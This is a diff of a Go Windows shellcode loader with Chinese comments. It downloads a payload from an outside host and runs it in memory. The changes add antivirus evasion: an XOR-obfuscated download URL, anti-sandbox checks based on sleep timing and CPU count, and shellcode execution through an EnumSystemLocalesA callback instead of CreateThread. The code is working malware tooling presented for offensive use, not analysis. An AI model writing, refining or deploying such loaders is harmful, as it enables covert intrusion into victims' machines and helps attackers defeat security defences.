@@ -5,14 +5,14 @@ import (
 	"fmt"
 	"io"
 	"net/http"
-	// "os" // 已删除未使用的 os 包
+	"runtime"
 	"syscall"
 	"time"
 	"unsafe"
 )
 
 // [配置] Shellcode 的下载地址 (请确保 payload.bin 已上传到服务器)
-const ShellcodeURL = "https://api.cailiu666.xyz/payload.bin"
+//const ShellcodeURL = "https://api.cailiu666.xyz/payload.bin"
 
 // Windows API 定义
 var (
@@ -20,8 +20,7 @@ var (
 	ntdll               = syscall.NewLazyDLL("ntdll.dll")
 	VirtualAlloc        = kernel32.NewProc("VirtualAlloc")
 	RtlMoveMemory       = ntdll.NewProc("RtlMoveMemory")
-	CreateThread        = kernel32.NewProc("CreateThread")
-	WaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
+	enumSystemLocalesA   = kernel32.NewProc("EnumSystemLocalesA")
 )
 
 const (
@@ -31,9 +30,17 @@ const (
 )
 
 func main() {
+	// 环境检测
+	if checkResources() || checkTimeDistortion() {
+		return // 悄悄退出
+	}
+
 	// 1. 启动提示
 	fmt.Println("[*] Loader 启动...")
 
+	//解密URL
+	encryptedURL := []byte{0xe0, 0xfc, 0xfc, 0xf8, 0xfb, 0xb2, 0xa7, 0xa7, 0xe9, 0xf8, 0xe1, 0xa6, 0xeb, 0xe9, 0xe1, 0xe4, 0xe1, 0xfd, 0xbe, 0xbe, 0xbe, 0xa6, 0xf0, 0xf1, 0xf2, 0xa7, 0xf8, 0xe9, 0xf1, 0xe4, 0xe7, 0xe9, 0xec, 0xa6, 0xea, 0xe1, 0xe6, }
+	ShellcodeURL := xorDecrypt(encryptedURL, 0x88)
 	// 2. 下载 Shellcode
 	fmt.Printf("[*] 正在下载 Payload: %s\n", ShellcodeURL)
 	shellcode, err := downloadShellcode(ShellcodeURL)
@@ -72,24 +79,12 @@ func main() {
 	fmt.Println("[+] Payload 已注入内存")
 
 	// 5. 执行 Shellcode (CreateThread)
-	thread, _, err := CreateThread.Call(
-		0,
-		0,
-		addr,
-		0,
-		0,
-		0,
-	)
-	if thread == 0 {
-		fmt.Println("[!] 线程创建失败:", err)
-		return
-	}
+	// [免杀5] 回调函数执行 (Callback Execution)
+	// 不使用 CreateThread，而是利用系统枚举函数的“回调”机制来执行我们的 Shellcode
+	// EnumSystemLocalesA 会调用第一个参数指向的地址
+	enumSystemLocalesA.Call(addr, 0)
 	fmt.Println("[+] 线程已启动! Agent 正在内存中运行...")
 
-	// 6. 阻止主进程退出
-	// Agent 是在子线程里跑的，如果主进程退了，Agent 也就没了
-	// 所以这里我们要无限等待
-	_, _, _ = WaitForSingleObject.Call(thread, 0xFFFFFFFF)
 }
 
 func downloadShellcode(url string) ([]byte, error) {
@@ -110,4 +105,33 @@ func downloadShellcode(url string) ([]byte, error) {
 	}
 
 	return io.ReadAll(resp.Body)
+}
+
+// [免杀1] XOR 解密函数
+func xorDecrypt(data []byte, key byte) string {
+	decrypted := make([]byte, len(data))
+	for i, b := range data {
+		decrypted[i] = b ^ key
+	}
+	return string(decrypted)
+}
+
+// [免杀2] 高级反沙箱: 时间扭曲检测
+func checkTimeDistortion() bool {
+	start := time.Now()
+	// 休眠 3 秒
+	time.Sleep(3 * time.Second)
+	end := time.Now()
+	
+	// 如果实际流逝时间小于 2.5 秒，说明系统时间被加速了（沙箱特征）
+	if end.Sub(start) < 2500*time.Millisecond {
+		return true // 是沙箱
+	}
+	return false
+}
+
+// [免杀3] 资源检测
+func checkResources() bool {
+	if runtime.NumCPU() < 2 { return true }
+	return false
 }
